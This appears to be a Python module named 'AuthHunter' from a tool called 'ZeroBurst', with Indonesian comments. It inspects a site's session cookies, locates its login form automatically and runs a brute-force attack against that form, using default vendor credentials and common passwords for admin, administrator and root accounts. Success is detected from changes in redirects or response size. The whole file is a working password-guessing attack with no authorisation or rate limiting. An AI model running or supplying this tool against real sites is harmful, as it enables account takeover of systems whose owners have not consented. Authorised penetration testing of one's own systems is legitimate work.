import requests
import concurrent.futures
from bs4 import BeautifulSoup
from colorama import Fore, Style
import random
import string

class AuthHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-AuthHunter/31.0'}
        
        # PASSWORD LIST (Top Common) - Bisa diganti file eksternal
        self.passwords = [
            "admin", "123456", "password", "12345678", "12345", "123456789",
            "1234", "1234567", "qwerty", "dragon", "admin123", "root", "toor",
            "letmein", "welcome", "login", "pass", "user", "guest", "test"
        ]
        
        # DEFAULT CREDENTIALS (Vendor Specific)
        self.default_creds = [
            ("admin", "admin"), ("root", "root"), ("admin", "password"),
            ("root", "toor"), ("user", "user"), ("guest", "guest"),
            ("tomcat", "s3cret"), ("admin", "1234"), ("support", "support")
        ]

    def analyze_session_security(self, response):
        """Mendeteksi potensi Session Hijacking (Weak Cookies)"""
        print(f"\n{Fore.YELLOW}[+] Passive Session Analysis (Hijack Detection)...{Style.RESET_ALL}")
        cookies = response.cookies
        if not cookies:
            print(f"   {Fore.WHITE}[-] No session cookies found.")
            return

        for cookie in cookies:
            risk = "LOW"
            issues = []
            
            # 1. Cek Flags
            if not cookie.secure: 
                issues.append("Missing Secure Flag (Man-in-the-Middle Risk)")
            
            # Cek HttpOnly (Perlu cek header raw karena requests object kadang menyembunyikannya)
            # Kita asumsi basic check dulu
            
            # 2. Cek Entropi (Kekuatan Acak)
            val = cookie.value
            if len(val) < 10:
                issues.append("Short Session ID (Bruteforce Risk)")
                risk = "HIGH"
            elif val.isalnum() and val.islower() and len(val) < 16:
                issues.append("Low Entropy (Only lowercase/digits)")
                risk = "MEDIUM"
            
            color = Fore.GREEN if not issues else Fore.RED
            print(f"   ├── Cookie: {Fore.WHITE}{cookie.name}{Style.RESET_ALL}")
            print(f"   ├── Value : {val[:10]}... (Length: {len(val)})")
            
            if issues:
                print(f"   └── {Fore.RED}[RISK: {risk}] Issues: {', '.join(issues)}{Style.RESET_ALL}")
            else:
                print(f"   └── {Fore.GREEN}[SAFE] Cookie looks robust.{Style.RESET_ALL}")

    def find_login_form(self):
        """Mencari form login secara otomatis"""
        print(f"\n{Fore.YELLOW}[+] Detecting Login Forms...{Style.RESET_ALL}")
        try:
            res = self.session.get(self.target, timeout=10)
            self.analyze_session_security(res) # Cek sesi saat load awal
            
            soup = BeautifulSoup(res.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                # Cari input password sebagai indikator login form
                pass_input = form.find('input', {'type': 'password'})
                if pass_input:
                    action = form.get('action') or self.target
                    if not action.startswith('http'):
                        action = requests.compat.urljoin(self.target, action)
                    
                    method = form.get('method', 'POST').upper()
                    
                    # Cari nama input username & password
                    inputs = form.find_all('input')
                    user_field = None
                    pass_field = pass_input.get('name')
                    
                    # Tebak field username (biasanya text/email sebelum password)
                    for inp in inputs:
                        if inp.get('type') in ['text', 'email'] and inp.get('name'):
                            user_field = inp.get('name')
                            break
                    
                    if user_field and pass_field:
                        print(f"   {Fore.GREEN}[FOUND] Login Form Detected!{Style.RESET_ALL}")
                        print(f"   ├── Action: {action}")
                        print(f"   ├── User Field: {user_field}")
                        print(f"   └── Pass Field: {pass_field}")
                        return action, method, user_field, pass_field, inputs
            
            print(f"{Fore.RED}[-] No login form detected on this page.{Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
            return None

    def bruteforce_attack(self, action, method, user_field, pass_field, other_inputs):
        """Melakukan serangan brute force cerdas"""
        print(f"\n{Fore.CYAN}[*] Starting Brute-Force & Default Credential Test...{Style.RESET_ALL}")
        
        # 1. Buat Baseline (Request Gagal)
        # Kita login dengan user acak untuk melihat respon "Gagal" seperti apa
        rnd_user = ''.join(random.choices(string.ascii_letters, k=8))
        rnd_pass = ''.join(random.choices(string.ascii_letters, k=8))
        
        base_data = {user_field: rnd_user, pass_field: rnd_pass}
        # Isi hidden fields lain agar request valid
        for inp in other_inputs:
            if inp.get('name') not in [user_field, pass_field] and inp.get('name'):
                base_data[inp.get('name')] = inp.get('value', '')

        try:
            if method == 'POST':
                base_res = self.session.post(action, data=base_data, allow_redirects=False)
            else:
                base_res = self.session.get(action, params=base_data, allow_redirects=False)
            
            base_len = len(base_res.text)
            base_code = base_res.status_code
            print(f"{Fore.WHITE}[INFO] Baseline Failure Profile: Code {base_code} | Size {base_len} bytes{Style.RESET_ALL}")
            
        except:
            print("[!] Failed to establish baseline.")
            return

        # 2. Generate Attack List
        attack_list = self.default_creds # Mulai dengan default
        # Tambah kombinasi user 'admin' dengan top password
        for p in self.passwords:
            attack_list.append(('admin', p))
            attack_list.append(('administrator', p))
            attack_list.append(('root', p))

        print(f"{Fore.YELLOW}[+] Testing {len(attack_list)} credential pairs...{Style.RESET_ALL}")

        found = False
        for user, password in attack_list:
            data = base_data.copy()
            data[user_field] = user
            data[pass_field] = password
            
            try:
                if method == 'POST':
                    res = self.session.post(action, data=data, allow_redirects=False)
                else:
                    res = self.session.get(action, params=data, allow_redirects=False)
                
                # LOGIKA DETEKSI SUKSES (ANOMALI)
                # Jika status code beda (misal 200 jadi 302 redirect)
                # ATAU ukuran file berubah drastis (misal > 10% beda)
                
                is_redirect = res.status_code in [301, 302] and base_code not in [301, 302]
                len_diff = abs(len(res.text) - base_len)
                
                if is_redirect or (len_diff > 500 and res.status_code == base_code):
                    print(f"   {Fore.RED}[CRITICAL] POSSIBLE LOGIN SUCCESS!{Style.RESET_ALL}")
                    print(f"   ├── Creds  : {Fore.YELLOW}{user}:{password}{Style.RESET_ALL}")
                    print(f"   ├── Status : {res.status_code} (Base: {base_code})")
                    print(f"   └── Size   : {len(res.text)} (Diff: {len_diff})")
                    found = True
                    # break # Uncomment jika ingin stop setelah ketemu satu
            except:
                pass
        
        if not found:
            print(f"{Fore.GREEN}[OK] No weak credentials found in basic dictionary.{Style.RESET_ALL}")

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Auth & Login Vulnerability Hunter{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        form_info = self.find_login_form()
        
        if form_info:
            action, method, user_f, pass_f, inputs = form_info
            self.bruteforce_attack(action, method, user_f, pass_f, inputs)
        
        print("-" * 60)

def run_auth_scan(url):
    engine = AuthHunter(url)
    engine.run_scan()